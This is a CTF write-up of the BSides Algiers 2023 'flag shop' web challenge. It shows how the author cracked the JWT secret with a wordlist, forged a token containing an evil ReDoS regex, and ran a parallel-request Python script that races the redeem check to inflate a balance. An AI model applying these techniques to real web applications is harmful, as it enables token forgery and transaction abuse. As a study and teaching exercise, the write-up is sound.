# bsides-algiers-2023-flagshop
Writeup for the flag shop challenge in the web 
category from bsides algiers CTF
# info about the challenge
- Description: They got some fancy flags out there, but that one really takes time to get.
- Solves: 7
- Author: ouxs
- The code provided is in app.py and utils.py
# solution
<p align="center">
<img alt="writeup" src="./writeup1.png" style="width:80%; 
display:block; margin-bottom:10px;">
</p>
&nbsp;&nbsp;&nbsp;When we first register a user to the website ,we see in the home page 3 flags and to solve the challenge we need to buy the flag that has a price of 40.99.
  
 &nbsp;&nbsp;&nbsp;We can see that we have an initial balance of 10 and an option to redeem a ticket and add 10 to the balance, in order to see the format needed for the tickets we must see the code ,in app.py after checking the /redeem route we see many important informations in this section of the code:
  
```python
ticket = request.form["ticket"]
        token_content = jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        username, regex = token_content["username"], token_content["ticket_regex"]
        if checkRedeem(username) and checkTicket(regex, ticket):
            userRedeem(username)
            return render_template("home.html", flags=flags, message="Ticket redeemed", balance=getBalance(username))
        else:
            return render_template("home.html", flags=flags, message="Can't redeem ticket", balance=getBalance(username))
```

   &nbsp;&nbsp;&nbsp;We can see that jwt is used and it has a ticket_regex in the payload, the regex is generated with the generateticket funtion in utils.py, we can clearly see that if a user sends a valid ticket once he will no longer be able to use the redeem option and thus the maximum balance he can have is 20 so we need to find a way to use the userRedeem function more than once. 
   
   &nbsp;&nbsp;&nbsp;I tried cracking the jwt to get the secret key using john the ripper and the rockyou wordlist to see if i can play with the jwt payload, i found the secret key: chickencurry. 
   
   &nbsp;&nbsp;&nbsp;After some research on how can regex be hard for computers to match against strings i found something called evil regex which are usually used for redos, so i thought of making a regex that can make the web server take long to match with the ticket so all the requests can pass the checkRedeem function before executing userRedeem(). 
   
   &nbsp;&nbsp;&nbsp;I experimented with some regex locally and i made this one ^(a+)+$| and the ticket that i will send is "aaaaaaaaaaaaaaaaaaaaaaaa!", this will match the regex and take sometime because the webserver will try the first regex (a+)+$ which is an evil regex and does not match the ticket so it will test all the possible ways to say that it doesn't match and with the or operator it will match the second regex so it will return a matching object. 
   
   &nbsp;&nbsp;&nbsp;Now after finding the regex we make a jwt with that regex and make a script to send parallel requests using multiprocessing to make our balance bigger than the flag price. 
   
   here is the script:
   ```python
   import requests
from multiprocessing import Process

if __name__ == '__main__':
    # Define the URL to send the POST request to
    url = 'https://vrlmcgzdzytq6fy-flags-shop.insts.bsides.shellmates.club/redeem'

    tok="your token"
    # Define the cookies to send with the request
    cookies = {'token': tok}
    payload="aaaaaaaaaaaaaaaaaaaaaa!"
    # Define the data to send in the request body
    data = {'ticket': payload}
    # Send POST requests in parallel using multiprocessing
    processlist = []
    for _ in range(0, 6):
        process = Process(target=requests.post, kwargs={"url":url,"cookies":cookies ,"data":data})
        processlist.append(process)

    for process in processlist:
        process.start()

    for process in processlist:
        process.join()
```
   &nbsp;&nbsp;&nbsp;Edit your token cookie with the jwt that you have, now you can buy the real flag!
   
